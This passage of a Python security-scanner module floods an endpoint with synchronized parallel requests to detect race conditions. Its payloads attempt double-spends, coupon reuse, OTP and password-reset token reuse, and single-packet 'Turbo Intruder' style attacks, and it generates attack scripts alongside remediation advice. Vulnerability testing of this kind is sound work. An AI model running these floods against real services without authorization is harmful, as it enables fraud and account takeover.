"""
Race Condition Detection Service

Advanced race condition and TOCTOU vulnerability detection including:
- Parallel request flooding (limit overrun, double-spend)
- Time-of-check to time-of-use (TOCTOU) detection
- Session race conditions (parallel session creation)
- File operation races
- Database transaction races
- Cache invalidation races
- Token/nonce reuse detection

Based on real-world race condition exploitation techniques.
"""

import asyncio
import aiohttp
import logging
import uuid
import time
import hashlib
import statistics
from dataclasses import dataclass, field, asdict
from typing import Dict, List, Any, Optional, Tuple, Callable
from enum import Enum
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

logger = logging.getLogger(__name__)


class RaceConditionType(str, Enum):
    """Types of race conditions to test."""
    LIMIT_OVERRUN = "limit_overrun"             # Bypass rate limits, quotas
    DOUBLE_SPEND = "double_spend"               # Use same resource twice
    TOCTOU = "toctou"                           # Time-of-check to time-of-use
    SESSION_RACE = "session_race"               # Parallel session manipulation
    TOKEN_REUSE = "token_reuse"                 # Reuse one-time tokens
    FILE_RACE = "file_race"                     # File operation race
    DB_TRANSACTION = "db_transaction"           # Database transaction race
    CACHE_RACE = "cache_race"                   # Cache invalidation race
    SIGNUP_RACE = "signup_race"                 # Duplicate account creation
    COUPON_RACE = "coupon_race"                 # Coupon/discount abuse


class RaceImpact(str, Enum):
    """Impact levels for race condition vulnerabilities."""
    CRITICAL = "critical"     # Financial loss, account takeover
    HIGH = "high"             # Data manipulation, privilege escalation
    MEDIUM = "medium"         # Information disclosure, minor manipulation
    LOW = "low"               # Denial of service, minor issues
    INFO = "info"             # Potential indicator only


@dataclass
class RacePayload:
    """A race condition test payload."""
    id: str
    race_type: RaceConditionType
    name: str
    description: str
    parallel_requests: int
    endpoint: str
    method: str
    headers: Dict[str, str] = field(default_factory=dict)
    body: Optional[str] = None
    body_template: Optional[str] = None  # Template with {iteration} placeholder
    expected_single_response: str = ""   # What single request should return
    success_indicator: str = ""          # What indicates successful race exploit
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            **asdict(self),
            "race_type": self.race_type.value,
        }


@dataclass
class RaceResult:
    """Result from a race condition test."""
    id: str
    payload_id: str
    race_type: RaceConditionType
    vulnerable: bool
    confidence: float
    impact: RaceImpact
    
    # Timing analysis
    total_requests: int
    successful_requests: int
    failed_requests: int
    avg_response_time_ms: float
    min_response_time_ms: float
    max_response_time_ms: float
    time_spread_ms: float
    
    # Response analysis
    unique_responses: int
    status_code_distribution: Dict[int, int]
    success_indicator_count: int
    
    indicators: List[str]
    error: Optional[str] = None
    raw_responses: List[Dict[str, Any]] = field(default_factory=list)
    
    def to_dict(self) -> Dict[str, Any]:
        result = asdict(self)
        result["race_type"] = self.race_type.value
        result["impact"] = self.impact.value
        return result


@dataclass
class RaceConditionFinding:
    """A confirmed race condition vulnerability finding."""
    id: str
    race_type: RaceConditionType
    endpoint: str
    severity: str
    title: str
    description: str
    proof_of_concept: str
    impact_description: str
    remediation: str
    cvss_score: float
    cvss_vector: str
    cwe_id: str
    results: List[RaceResult] = field(default_factory=list)
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            **asdict(self),
            "race_type": self.race_type.value,
            "results": [r.to_dict() for r in self.results],
        }


# =============================================================================
# RACE CONDITION PAYLOADS
# =============================================================================

def generate_limit_overrun_payloads(endpoint: str, method: str = "POST") -> List[RacePayload]:
    """Generate limit overrun/bypass payloads."""
    payloads = []
    
    # Rate limit bypass
    payloads.append(RacePayload(
        id="limit_overrun_rate",
        race_type=RaceConditionType.LIMIT_OVERRUN,
        name="Rate Limit Bypass",
        description="Send parallel requests to bypass rate limiting",
        parallel_requests=50,
        endpoint=endpoint,
        method=method,
        success_indicator="success",
        expected_single_response="rate limit",
    ))
    
    # Quota bypass
    payloads.append(RacePayload(
        id="limit_overrun_quota",
        race_type=RaceConditionType.LIMIT_OVERRUN,
        name="Quota Limit Bypass",
        description="Bypass resource quota by parallel requests",
        parallel_requests=20,
        endpoint=endpoint,
        method=method,
        body='{"action": "consume_resource"}',
        headers={"Content-Type": "application/json"},
        success_indicator="resource_consumed",
    ))
    
    return payloads


def generate_double_spend_payloads(endpoint: str) -> List[RacePayload]:
    """Generate double-spend attack payloads."""
    payloads = []
    
    # Classic double-spend
    payloads.append(RacePayload(
        id="double_spend_transfer",
        race_type=RaceConditionType.DOUBLE_SPEND,
        name="Double-Spend Transfer",
        description="Attempt to spend same balance twice via parallel transfers",
        parallel_requests=10,
        endpoint=endpoint,
        method="POST",
        body='{"action": "transfer", "amount": 100, "to": "attacker"}',
        headers={"Content-Type": "application/json"},
        success_indicator="transfer_complete",
    ))
    
    # Withdrawal race
    payloads.append(RacePayload(
        id="double_spend_withdraw",
        race_type=RaceConditionType.DOUBLE_SPEND,
        name="Double Withdrawal",
        description="Withdraw same funds multiple times",
        parallel_requests=5,
        endpoint=endpoint,
        method="POST",
        body='{"action": "withdraw", "amount": 1000}',
        headers={"Content-Type": "application/json"},
        success_indicator="withdrawal_success",
    ))
    
    return payloads


def generate_token_reuse_payloads(endpoint: str, token: str = "") -> List[RacePayload]:
    """Generate token reuse attack payloads."""
    payloads = []
    
    # OTP reuse
    payloads.append(RacePayload(
        id="token_reuse_otp",
        race_type=RaceConditionType.TOKEN_REUSE,
        name="OTP Reuse Attack",
        description="Use same OTP token in parallel requests",
        parallel_requests=10,
        endpoint=endpoint,
        method="POST",
        body=f'{{"otp": "{token or "123456"}"}}',
        headers={"Content-Type": "application/json"},
        success_indicator="verified",
    ))
    
    # Password reset token
    payloads.append(RacePayload(
        id="token_reuse_reset",
        race_type=RaceConditionType.TOKEN_REUSE,
        name="Password Reset Token Reuse",
        description="Reuse password reset token in parallel",
        parallel_requests=5,
        endpoint=endpoint,
        method="POST",
        body=f'{{"token": "{token or "reset_token"}", "new_password": "hacked123"}}',
        headers={"Content-Type": "application/json"},
        success_indicator="password_changed",
    ))
    
    # Invite code reuse
    payloads.append(RacePayload(
        id="token_reuse_invite",
        race_type=RaceConditionType.TOKEN_REUSE,
        name="Invite Code Reuse",
        description="Use limited-use invite code multiple times",
        parallel_requests=10,
        endpoint=endpoint,
        method="POST",
        body_template='{{"invite_code": "INVITE123", "email": "user{iteration}@test.com"}}',
        headers={"Content-Type": "application/json"},
        success_indicator="account_created",
    ))
    
    return payloads


def generate_signup_race_payloads(endpoint: str, username: str = "racetest") -> List[RacePayload]:
    """Generate signup race condition payloads."""
    payloads = []
    
    # Duplicate username race
    payloads.append(RacePayload(
        id="signup_race_username",
        race_type=RaceConditionType.SIGNUP_RACE,
        name="Duplicate Username Race",
        description="Create multiple accounts with same username via race",
        parallel_requests=20,
        endpoint=endpoint,
        method="POST",
        body=f'{{"username": "{username}", "email": "race{{iteration}}@test.com", "password": "test123"}}',
        headers={"Content-Type": "application/json"},
        success_indicator="account_created",
    ))
    
    # Duplicate email race
    payloads.append(RacePayload(
        id="signup_race_email",
        race_type=RaceConditionType.SIGNUP_RACE,
        name="Duplicate Email Race",
        description="Create multiple accounts with same email via race",
        parallel_requests=20,
        endpoint=endpoint,
        method="POST",
        body=f'{{"username": "user{{iteration}}", "email": "{username}@test.com", "password": "test123"}}',
        headers={"Content-Type": "application/json"},
        success_indicator="account_created",
    ))
    
    return payloads


def generate_coupon_race_payloads(endpoint: str, coupon: str = "DISCOUNT50") -> List[RacePayload]:
    """Generate coupon/discount race payloads."""
    payloads = []
    
    # Single-use coupon reuse
    payloads.append(RacePayload(
        id="coupon_race_single",
        race_type=RaceConditionType.COUPON_RACE,
        name="Single-Use Coupon Race",
        description="Apply single-use coupon multiple times via race",
        parallel_requests=15,
        endpoint=endpoint,
        method="POST",
        body=f'{{"coupon_code": "{coupon}"}}',
        headers={"Content-Type": "application/json"},
        success_indicator="discount_applied",
    ))
    
    # Limited-quantity race
    payloads.append(RacePayload(
        id="coupon_race_limited",
        race_type=RaceConditionType.COUPON_RACE,
        name="Limited Quantity Coupon Race",
        description="Claim limited-quantity offer beyond limit",
        parallel_requests=30,
        endpoint=endpoint,
        method="POST",
        body=f'{{"promo_id": "LIMITED_OFFER", "claim": true}}',
        headers={"Content-Type": "application/json"},
        success_indicator="claimed",
    ))
    
    return payloads


def generate_toctou_payloads(check_endpoint: str, use_endpoint: str) -> List[RacePayload]:
    """Generate TOCTOU payloads for two-step operations."""
    payloads = []
    
    # File access TOCTOU
    payloads.append(RacePayload(
        id="toctou_file_access",
        race_type=RaceConditionType.TOCTOU,
        name="File Access TOCTOU",
        description="Exploit window between permission check and file access",
        parallel_requests=50,
        endpoint=use_endpoint,  # The use endpoint
        method="GET",
        expected_single_response="permission denied",
        success_indicator="file_content",
    ))
    
    return payloads


# =============================================================================
# RACE CONDITION DETECTOR
# =============================================================================

class RaceConditionDetector:
    """Detects race condition vulnerabilities."""
    
    def __init__(
        self,
        timeout: float = 30.0,
        max_workers: int = 100,
    ):
        self.timeout = timeout
        self.max_workers = max_workers
        self._results: List[RaceResult] = []
        self._findings: List[RaceConditionFinding] = []
        self._session: Optional[aiohttp.ClientSession] = None
    
    async def _ensure_session(self):
        """Ensure aiohttp session exists."""
        if self._session is None or self._session.closed:
            connector = aiohttp.TCPConnector(
                limit=self.max_workers,
                limit_per_host=self.max_workers,
                force_close=False,
                enable_cleanup_closed=True,
            )
            self._session = aiohttp.ClientSession(
                connector=connector,
                timeout=aiohttp.ClientTimeout(total=self.timeout),
            )
    
    async def _close_session(self):
        """Close aiohttp session."""
        if self._session and not self._session.closed:
            await self._session.close()
    
    async def _send_request(
        self,
        url: str,
        method: str,
        headers: Dict[str, str],
        body: Optional[str],
        request_id: int,
    ) -> Dict[str, Any]:
        """Send a single request and return result."""
        start_time = time.time()
        
        try:
            await self._ensure_session()
            
            kwargs = {
                "headers": headers,
                "ssl": False,  # Disable SSL verification for testing
            }
            
            if body:
                kwargs["data"] = body
            
            async with self._session.request(method, url, **kwargs) as response:
                response_body = await response.text()
                elapsed = (time.time() - start_time) * 1000
                
                return {
                    "success": True,
                    "request_id": request_id,
                    "status_code": response.status,
                    "body": response_body[:2000],
                    "headers": dict(response.headers),
                    "response_time_ms": elapsed,
                    "timestamp": time.time(),
                }
                
        except asyncio.TimeoutError:
            return {
                "success": False,
                "request_id": request_id,
                "error": "timeout",
                "response_time_ms": (time.time() - start_time) * 1000,
                "timestamp": time.time(),
            }
            
        except Exception as e:
            return {
                "success": False,
                "request_id": request_id,
                "error": str(e),
                "response_time_ms": (time.time() - start_time) * 1000,
                "timestamp": time.time(),
            }
    
    async def _flood_requests(
        self,
        url: str,
        method: str,
        headers: Dict[str, str],
        bodies: List[Optional[str]],
        sync_start: bool = True,
    ) -> List[Dict[str, Any]]:
        """
        Send multiple requests as simultaneously as possible.
        
        Args:
            url: Target URL
            method: HTTP method
            headers: Request headers
            bodies: List of request bodies (one per request)
            sync_start: If True, use barrier to start all requests at same time
        """
        await self._ensure_session()
        
        num_requests = len(bodies)
        
        if sync_start:
            # Use asyncio barrier to synchronize start
            barrier = asyncio.Barrier(num_requests)
            
            async def send_with_barrier(body: Optional[str], req_id: int):
                await barrier.wait()  # Wait for all requests to be ready
                return await self._send_request(url, method, headers, body, req_id)
            
            tasks = [
                send_with_barrier(body, i)
                for i, body in enumerate(bodies)
            ]
        else:
            tasks = [
                self._send_request(url, method, headers, body, i)
                for i, body in enumerate(bodies)
            ]
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Process results
        processed = []
        for i, result in enumerate(results):
            if isinstance(result, Exception):
                processed.append({
                    "success": False,
                    "request_id": i,
                    "error": str(result),
                    "response_time_ms": 0,
                    "timestamp": time.time(),
                })
            else:
                processed.append(result)
        
        return processed
    
    def _analyze_race_results(
        self,
        payload: RacePayload,
        responses: List[Dict[str, Any]],
    ) -> Tuple[bool, float, RaceImpact, List[str]]:
        """
        Analyze responses to determine if race condition exists.
        
        Returns:
            (vulnerable, confidence, impact, indicators)
        """
        indicators = []
        vulnerable = False
        confidence = 0.0
        impact = RaceImpact.INFO
        
        successful = [r for r in responses if r.get("success")]
        failed = [r for r in responses if not r.get("success")]
        
        if not successful:
            indicators.append("All requests failed - target may be down")
            return False, 0.0, RaceImpact.INFO, indicators
        
        # Analyze timing spread
        times = [r["response_time_ms"] for r in successful]
        time_spread = max(times) - min(times) if times else 0
        avg_time = statistics.mean(times) if times else 0
        
        # Small time spread = requests processed nearly simultaneously
        if time_spread < 100 and len(successful) >= 5:
            indicators.append(f"Tight timing spread ({time_spread:.0f}ms) - requests processed in parallel")
        
        # Analyze status codes
        status_codes = [r.get("status_code") for r in successful if r.get("status_code")]
        unique_codes = set(status_codes)
        
        # Analyze response bodies
        bodies = [r.get("body", "") for r in successful]
        unique_bodies = set(bodies)
        
        # Count success indicators
        success_count = 0
        if payload.success_indicator:
            success_count = sum(
                1 for b in bodies 
                if payload.success_indicator.lower() in b.lower()
            )
        
        # Detection logic based on race type
        if payload.race_type == RaceConditionType.LIMIT_OVERRUN:
            # For limit bypass, success = many successful responses when expecting rate limit
            if success_count > len(successful) * 0.5:
                indicators.append(f"{success_count}/{len(successful)} requests succeeded - possible rate limit bypass")
                vulnerable = True
                confidence = min(success_count / len(successful), 0.9)
                impact = RaceImpact.MEDIUM
            
            if 200 in unique_codes and len([c for c in status_codes if c == 200]) > 10:
                indicators.append("Many 200 responses received - rate limit may be bypassed")
                vulnerable = True
                confidence = max(confidence, 0.7)
        
        elif payload.race_type == RaceConditionType.DOUBLE_SPEND:
            # Multiple success responses = double spend
            if success_count >= 2:
                indicators.append(f"Multiple successful transactions ({success_count}) - DOUBLE SPEND CONFIRMED")
                vulnerable = True
                confidence = 0.95
                impact = RaceImpact.CRITICAL
            elif success_count == 1 and len(unique_codes) > 1:
                indicators.append("Mixed responses - potential race window detected")
                confidence = 0.5
        
        elif payload.race_type == RaceConditionType.TOKEN_REUSE:
            # Token should only work once
            if success_count >= 2:
                indicators.append(f"Token accepted {success_count} times - TOKEN REUSE VULNERABILITY")
                vulnerable = True
                confidence = 0.9
                impact = RaceImpact.HIGH
        
        elif payload.race_type == RaceConditionType.SIGNUP_RACE:
            # Duplicate accounts created
            if success_count >= 2:
                indicators.append(f"{success_count} accounts created with same identifier - SIGNUP RACE")
                vulnerable = True
                confidence = 0.85
                impact = RaceImpact.HIGH
        
        elif payload.race_type == RaceConditionType.COUPON_RACE:
            # Coupon applied multiple times
            if success_count >= 2:
                indicators.append(f"Coupon applied {success_count} times - COUPON ABUSE POSSIBLE")
                vulnerable = True
                confidence = 0.9
                impact = RaceImpact.HIGH
        
        elif payload.race_type == RaceConditionType.TOCTOU:
            # Different responses = TOCTOU window
            if len(unique_bodies) > 2 and payload.success_indicator:
                if any(payload.success_indicator.lower() in b.lower() for b in bodies):
                    indicators.append("Inconsistent responses with success indicator - TOCTOU detected")
                    vulnerable = True
                    confidence = 0.8
                    impact = RaceImpact.HIGH
        
        # General indicators
        if len(unique_codes) > 2:
            indicators.append(f"Inconsistent status codes: {unique_codes} - potential desync")
            confidence = max(confidence, 0.4)
        
        if len(unique_bodies) > 3 and len(successful) > 10:
            indicators.append(f"{len(unique_bodies)} unique responses - inconsistent state handling")
            confidence = max(confidence, 0.5)
        
        if not indicators:
            indicators.append("No race condition indicators detected")
        
        return vulnerable, confidence, impact, indicators
    
    async def test_payload(
        self,
        url: str,
        payload: RacePayload,
        auth_headers: Optional[Dict[str, str]] = None,
    ) -> RaceResult:
        """Test a single race condition payload."""
        # Combine headers
        headers = {**payload.headers}
        if auth_headers:
            headers.update(auth_headers)
        
        # Generate request bodies
        bodies = []
        for i in range(payload.parallel_requests):
            if payload.body_template:
                body = payload.body_template.replace("{iteration}", str(i))
            else:
                body = payload.body
            bodies.append(body)
        
        # Build full URL
        full_url = f"{url.rstrip('/')}/{payload.endpoint.lstrip('/')}" if payload.endpoint else url
        
        # Flood requests
        responses = await self._flood_requests(
            full_url,
            payload.method,
            headers,
            bodies,
            sync_start=True,
        )
        
        # Analyze results
        vulnerable, confidence, impact, indicators = self._analyze_race_results(payload, responses)
        
        # Calculate statistics
        successful = [r for r in responses if r.get("success")]
        failed = [r for r in responses if not r.get("success")]
        times = [r["response_time_ms"] for r in successful]
        
        status_dist = {}
        for r in successful:
            code = r.get("status_code", 0)
            status_dist[code] = status_dist.get(code, 0) + 1
        
        success_indicator_count = 0
        if payload.success_indicator:
            for r in successful:
                if payload.success_indicator.lower() in r.get("body", "").lower():
                    success_indicator_count += 1
        
        result = RaceResult(
            id=str(uuid.uuid4())[:8],
            payload_id=payload.id,
            race_type=payload.race_type,
            vulnerable=vulnerable,
            confidence=confidence,
            impact=impact,
            total_requests=len(responses),
            successful_requests=len(successful),
            failed_requests=len(failed),
            avg_response_time_ms=statistics.mean(times) if times else 0,
            min_response_time_ms=min(times) if times else 0,
            max_response_time_ms=max(times) if times else 0,
            time_spread_ms=max(times) - min(times) if times else 0,
            unique_responses=len(set(r.get("body", "") for r in successful)),
            status_code_distribution=status_dist,
            success_indicator_count=success_indicator_count,
            indicators=indicators,
            raw_responses=responses[:10],  # Keep first 10 for analysis
        )
        
        self._results.append(result)
        return result
    
    async def scan(
        self,
        url: str,
        race_types: Optional[List[RaceConditionType]] = None,
        custom_payloads: Optional[List[RacePayload]] = None,
        auth_headers: Optional[Dict[str, str]] = None,
        callback: Optional[Callable] = None,
    ) -> Dict[str, Any]:
        """
        Scan for race condition vulnerabilities.
        
        Args:
            url: Base target URL
            race_types: Types of race conditions to test
            custom_payloads: Custom payloads to test
            auth_headers: Authentication headers
            callback: Progress callback
            
        Returns:
            Scan results with findings
        """
        all_payloads = []
        
        if custom_payloads:
            all_payloads.extend(custom_payloads)
        
        if race_types:
            # Generate payloads for specified types
            for rt in race_types:
                if rt == RaceConditionType.LIMIT_OVERRUN:
                    all_payloads.extend(generate_limit_overrun_payloads("/api/action"))
                elif rt == RaceConditionType.DOUBLE_SPEND:
                    all_payloads.extend(generate_double_spend_payloads("/api/transfer"))
                elif rt == RaceConditionType.TOKEN_REUSE:
                    all_payloads.extend(generate_token_reuse_payloads("/api/verify"))
                elif rt == RaceConditionType.SIGNUP_RACE:
                    all_payloads.extend(generate_signup_race_payloads("/api/signup"))
                elif rt == RaceConditionType.COUPON_RACE:
                    all_payloads.extend(generate_coupon_race_payloads("/api/apply-coupon"))
        
        if not all_payloads:
            # Default: test common endpoints
            all_payloads.extend(generate_limit_overrun_payloads("/api/"))
        
        results = []
        findings = []
        
        try:
            for i, payload in enumerate(all_payloads):
                if callback:
                    await callback({
                        "type": "progress",
                        "current": i + 1,
                        "total": len(all_payloads),
                        "payload": payload.name,
                    })
                
                try:
                    result = await self.test_payload(url, payload, auth_headers)
                    results.append(result)
                    
                    if result.vulnerable and result.confidence >= 0.6:
                        finding = self._create_finding(url, payload, result)
                        findings.append(finding)
                        self._findings.append(finding)
                        
                        if callback:
                            await callback({
                                "type": "finding",
                                "finding": finding.to_dict(),
                            })
                            
                except Exception as e:
                    logger.error(f"Error testing payload {payload.id}: {e}")
                    results.append(RaceResult(
                        id=str(uuid.uuid4())[:8],
                        payload_id=payload.id,
                        race_type=payload.race_type,
                        vulnerable=False,
                        confidence=0.0,
                        impact=RaceImpact.INFO,
                        total_requests=0,
                        successful_requests=0,
                        failed_requests=0,
                        avg_response_time_ms=0,
                        min_response_time_ms=0,
                        max_response_time_ms=0,
                        time_spread_ms=0,
                        unique_responses=0,
                        status_code_distribution={},
                        success_indicator_count=0,
                        indicators=[f"Error: {e}"],
                        error=str(e),
                    ))
                
                # Brief pause between tests
                await asyncio.sleep(1.0)
                
        finally:
            await self._close_session()
        
        return {
            "url": url,
            "payloads_tested": len(all_payloads),
            "total_requests_sent": sum(r.total_requests for r in results),
            "results": [r.to_dict() for r in results],
            "findings": [f.to_dict() for f in findings],
            "vulnerable": any(r.vulnerable for r in results),
            "highest_impact": max(
                (r.impact for r in results if r.vulnerable),
                default=RaceImpact.INFO,
                key=lambda x: ["info", "low", "medium", "high", "critical"].index(x.value)
            ).value,
        }
    
    def _create_finding(
        self,
        url: str,
        payload: RacePayload,
        result: RaceResult,
    ) -> RaceConditionFinding:
        """Create a finding from a vulnerable result."""
        
        severity_map = {
            RaceImpact.CRITICAL: "critical",
            RaceImpact.HIGH: "high",
            RaceImpact.MEDIUM: "medium",
            RaceImpact.LOW: "low",
            RaceImpact.INFO: "info",
        }
        
        cvss_map = {
            RaceImpact.CRITICAL: (9.1, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"),
            RaceImpact.HIGH: (7.5, "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"),
            RaceImpact.MEDIUM: (5.9, "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:H/A:N"),
            RaceImpact.LOW: (3.7, "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"),
            RaceImpact.INFO: (0.0, ""),
        }
        
        cwe_map = {
            RaceConditionType.LIMIT_OVERRUN: "CWE-770",  # Allocation without limits
            RaceConditionType.DOUBLE_SPEND: "CWE-362",   # Race condition
            RaceConditionType.TOCTOU: "CWE-367",         # TOCTOU
            RaceConditionType.SESSION_RACE: "CWE-362",
            RaceConditionType.TOKEN_REUSE: "CWE-384",    # Session fixation
            RaceConditionType.FILE_RACE: "CWE-367",
            RaceConditionType.DB_TRANSACTION: "CWE-362",
            RaceConditionType.CACHE_RACE: "CWE-362",
            RaceConditionType.SIGNUP_RACE: "CWE-362",
            RaceConditionType.COUPON_RACE: "CWE-362",
        }
        
        cvss_score, cvss_vector = cvss_map.get(result.impact, (0.0, ""))
        cwe_id = cwe_map.get(payload.race_type, "CWE-362")
        
        impact_descriptions = {
            RaceConditionType.LIMIT_OVERRUN: "Attackers can bypass rate limits or quotas, potentially leading to resource exhaustion, DoS, or abuse of limited resources.",
            RaceConditionType.DOUBLE_SPEND: "Critical financial impact - attackers can spend the same balance/resource multiple times, leading to monetary loss.",
            RaceConditionType.TOCTOU: "Attackers can exploit the window between security check and resource use to bypass authorization.",
            RaceConditionType.TOKEN_REUSE: "One-time tokens can be reused, potentially bypassing 2FA, email verification, or password resets.",
            RaceConditionType.SIGNUP_RACE: "Multiple accounts can be created with the same identifier, bypassing uniqueness constraints.",
            RaceConditionType.COUPON_RACE: "Discount codes or limited offers can be claimed multiple times, causing financial loss.",
        }
        
        poc = f"""# Race Condition - {payload.race_type.value}
# Target: {url}
# Endpoint: {payload.endpoint}
# Attack Type: {payload.name}

# Test Configuration:
# - Parallel Requests: {payload.parallel_requests}
# - Method: {payload.method}
# - Success Indicator: {payload.success_indicator}

# Results:
# - Total Requests: {result.total_requests}
# - Successful: {result.successful_requests}
# - Success Indicator Matches: {result.success_indicator_count}
# - Time Spread: {result.time_spread_ms:.0f}ms

# Indicators Found:
{chr(10).join(f'# - {ind}' for ind in result.indicators)}

# Python PoC using asyncio:
import asyncio
import aiohttp

async def race_attack():
    async with aiohttp.ClientSession() as session:
        tasks = []
        for i in range({payload.parallel_requests}):
            task = session.{payload.method.lower()}(
                "{url}{payload.endpoint}",
                headers={payload.headers},
                data={repr(payload.body) if payload.body else 'None'},
            )
            tasks.append(task)
        
        responses = await asyncio.gather(*tasks)
        for i, resp in enumerate(responses):
            print(f"Request {{i}}: {{resp.status}}")

asyncio.run(race_attack())
"""
        
        return RaceConditionFinding(
            id=str(uuid.uuid4())[:8],
            race_type=payload.race_type,
            endpoint=f"{url}{payload.endpoint}",
            severity=severity_map[result.impact],
            title=f"Race Condition: {payload.name}",
            description=f"{payload.description}\n\nIndicators:\n" + "\n".join(f"- {i}" for i in result.indicators),
            proof_of_concept=poc,
            impact_description=impact_descriptions.get(payload.race_type, "Race condition allowing unauthorized actions"),
            remediation=self._get_remediation(payload.race_type),
            cvss_score=cvss_score,
            cvss_vector=cvss_vector,
            cwe_id=cwe_id,
            results=[result],
        )
    
    def _get_remediation(self, race_type: RaceConditionType) -> str:
        """Get remediation guidance for race type."""
        remediations = {
            RaceConditionType.LIMIT_OVERRUN: """To prevent rate limit bypass:
1. Use atomic operations for counter increments
2. Implement distributed rate limiting with Redis INCR
3. Add request queuing/serialization for sensitive operations
4. Use pessimistic locking on rate limit checks
5. Implement exponential backoff on repeated violations""",
            
            RaceConditionType.DOUBLE_SPEND: """To prevent double-spend attacks:
1. Use database transactions with proper isolation (SERIALIZABLE)
2. Implement optimistic locking with version numbers
3. Use SELECT FOR UPDATE for balance checks
4. Add idempotency keys to financial operations
5. Implement distributed locks for critical sections
6. Use event sourcing pattern for audit trail""",
            
            RaceConditionType.TOCTOU: """To prevent TOCTOU vulnerabilities:
1. Perform authorization check at time of use, not before
2. Use atomic operations that combine check and action
3. Implement file locks for file operations
4. Use database transactions to lock resources
5. Avoid caching authorization decisions""",
            
            RaceConditionType.TOKEN_REUSE: """To prevent token reuse:
1. Mark tokens as used atomically with the verification
2. Use database UNIQUE constraints on token usage
3. Implement one-time token tables with DELETE on use
4. Add expiration timestamps to tokens
5. Use cryptographic nonces with server-side tracking""",
            
            RaceConditionType.SIGNUP_RACE: """To prevent duplicate signup races:
1. Use database UNIQUE constraints at application and DB level
2. Implement distributed locks during signup
3. Use INSERT ... ON CONFLICT for atomic creation
4. Add email/username pre-registration with TTL
5. Queue signup requests for sequential processing""",
            
            RaceConditionType.COUPON_RACE: """To prevent coupon/discount abuse:
1. Use atomic decrement for usage counts
2. Implement pessimistic locking on coupon redemption
3. Track redemptions with UNIQUE user+coupon constraints
4. Use idempotency keys for apply operations
5. Implement fraud detection for rapid redemptions""",
        }
        
        return remediations.get(race_type, """General race condition prevention:
1. Use atomic operations for state changes
2. Implement proper locking mechanisms
3. Use database transactions appropriately
4. Add idempotency keys to sensitive operations
5. Consider request serialization for critical paths""")
    
    def get_findings(self) -> List[RaceConditionFinding]:
        """Get all findings from scans."""
        return self._findings
    
    def get_results(self) -> List[RaceResult]:
        """Get all raw results from scans."""
        return self._results
    
    def clear(self):
        """Clear stored results and findings."""
        self._results.clear()
        self._findings.clear()


# Global detector instance
_race_detector = RaceConditionDetector()


async def scan_for_race_conditions(
    url: str,
    race_types: Optional[List[str]] = None,
    auth_headers: Optional[Dict[str, str]] = None,
    callback: Optional[Callable] = None,
) -> Dict[str, Any]:
    """
    Convenience function to scan for race conditions.
    
    Args:
        url: Target URL
        race_types: List of race type names
        auth_headers: Authentication headers
        callback: Progress callback
        
    Returns:
        Scan results
    """
    type_enums = None
    if race_types:
        type_enums = [RaceConditionType(t) for t in race_types]
    
    detector = RaceConditionDetector()
    return await detector.scan(url, type_enums, auth_headers=auth_headers, callback=callback)


# =============================================================================
# TURBO INTRUDER STYLE ATTACK
# =============================================================================

class TurboIntruder:
    """
    High-performance race condition tester inspired by Turbo Intruder.
    Uses TCP connection pooling and precise timing for maximum impact.
    """
    
    def __init__(
        self,
        connections: int = 20,
        requests_per_connection: int = 10,
    ):
        self.connections = connections
        self.requests_per_connection = requests_per_connection
    
    async def single_packet_attack(
        self,
        url: str,
        method: str,
        headers: Dict[str, str],
        bodies: List[str],
    ) -> List[Dict[str, Any]]:
        """
        Attempt to send all requests in a single TCP packet.
        This maximizes the chance of requests arriving simultaneously.
        """
        from urllib.parse import urlparse
        import socket
        
        parsed = urlparse(url)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        path = parsed.path or "/"
        
        # Build raw HTTP requests
        raw_requests = []
        for body in bodies:
            lines = [f"{method} {path} HTTP/1.1"]
            lines.append(f"Host: {host}")
            for h, v in headers.items():
                lines.append(f"{h}: {v}")
            if body:
                lines.append(f"Content-Length: {len(body)}")
            lines.append("")
            if body:
                lines.append(body)
            raw_requests.append("\r\n".join(lines) + "\r\n")
        
        # Combine into single payload (pipelining)
        combined = "".join(raw_requests)
        
        results = []
        start_time = time.time()
        
        try:
            # Send all at once
            if parsed.scheme == "https":
                import ssl
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = socket.create_connection((host, port))
                sock = context.wrap_socket(sock, server_hostname=host)
            else:
                sock = socket.create_connection((host, port))
            
            sock.setblocking(False)
            sock.sendall(combined.encode())
            
            # Receive responses
            await asyncio.sleep(0.5)  # Wait for responses
            
            try:
                response_data = sock.recv(65536)
                elapsed = (time.time() - start_time) * 1000
                
                # Parse multiple responses
                responses = response_data.decode('utf-8', errors='replace').split("HTTP/1.")
                
                for i, resp in enumerate(responses[1:]):  # Skip first empty
                    results.append({
                        "success": True,
                        "request_id": i,
                        "response": "HTTP/1." + resp[:500],
                        "response_time_ms": elapsed,
                    })
                    
            except BlockingIOError:
                pass
            
            sock.close()
            
        except Exception as e:
            results.append({
                "success": False,
                "error": str(e),
                "response_time_ms": (time.time() - start_time) * 1000,
            })
        
        return results
    
    async def connection_warming_attack(
        self,
        url: str,
        method: str,
        headers: Dict[str, str],
        attack_body: str,
        warmup_count: int = 5,
    ) -> List[Dict[str, Any]]:
        """
        Warm up connections with benign requests, then fire attack.
        This ensures all connections are established and ready.
        """
        connector = aiohttp.TCPConnector(
            limit=self.connections,
            force_close=False,
        )
        
        async with aiohttp.ClientSession(connector=connector) as session:
            # Warmup phase
            warmup_tasks = []
            for _ in range(warmup_count):
                warmup_tasks.append(
                    session.get(url, headers=headers)
                )
            await asyncio.gather(*warmup_tasks, return_exceptions=True)
            
            # Attack phase - all connections warmed
            barrier = asyncio.Barrier(self.connections)
            
            async def attack_request(conn_id: int):
                await barrier.wait()
                start = time.time()
                try:
                    async with session.request(method, url, headers=headers, data=attack_body) as resp:
                        body = await resp.text()
                        return {
                            "success": True,
                            "connection_id": conn_id,
                            "status_code": resp.status,
                            "body": body[:500],
                            "response_time_ms": (time.time() - start) * 1000,
                        }
                except Exception as e:
                    return {
                        "success": False,
                        "connection_id": conn_id,
